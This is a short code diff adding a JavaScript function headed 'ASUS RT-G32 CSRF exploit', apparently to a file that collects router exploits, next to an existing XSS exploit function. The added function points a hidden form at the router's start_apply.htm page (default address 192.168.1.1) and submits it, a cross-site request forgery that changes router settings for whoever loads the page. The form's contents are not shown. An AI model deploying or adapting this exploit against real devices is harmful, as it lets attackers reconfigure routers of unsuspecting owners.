@@ -2401,3 +2401,13 @@ function rtg32xss(ip)
 		document.rt632xssf.submit();
 	}
 }
+// ASUS RT-G32 CSRF exploit (C) 2015 MustLive. http://websecurity.com.ua
+function rt632csrfx(ip)
+{
+    ip = ip || "192.168.1.1";
+
+		document.rt632csrf.action="http://"+ip+"/start_apply.htm";
+	if (ip==null || ip==""){}else{
+		document.rt632csrf.submit();
+	}
+}
